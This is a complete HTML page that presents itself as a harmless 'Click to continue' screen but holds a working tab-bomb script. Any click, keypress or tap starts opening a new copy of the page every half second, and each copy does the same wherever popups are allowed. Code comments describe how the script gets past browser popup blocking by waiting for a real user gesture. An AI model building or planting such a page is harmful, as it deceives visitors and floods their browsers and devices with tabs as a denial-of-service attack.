<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Click to continue</title>
<style>body{font-family:system-ui,sans-serif;text-align:center;padding:20vh 1em}button{font-size:2em;padding:.5em 1em;cursor:pointer}#count{margin-top:1em;color:#666}</style>
</head>
<body>
<h1>Click to continue</h1>
<button id="go">Continue</button>
<p id="count"></p>
<script>
let n = 0, started = false;
function start() {
  if (started) return;
  started = true;
  setInterval(() => {
    n++;
    document.getElementById("count").textContent = "Tabs opened: " + n + " (close this tab to stop)";
    window.open(location.href, "_blank");
  }, 500);
}
document.getElementById("go").addEventListener("click", start);
// Auto attempt on load: a scripted click / load-time window.open is
// NOT a real user gesture, so browsers usually block it. It only
// works if popups are already allowed for this site, in which case
// each new tab does the same on load and the chain continues.
// Otherwise the real trigger below is what starts it: any first
// click, keypress, or tap anywhere on the page.
try { window.open(location.href, "_blank"); } catch (e) {}
["click", "keydown", "touchstart"].forEach((e) =>
  document.addEventListener(e, start, { once: true }));
</script>
</body>
</html>
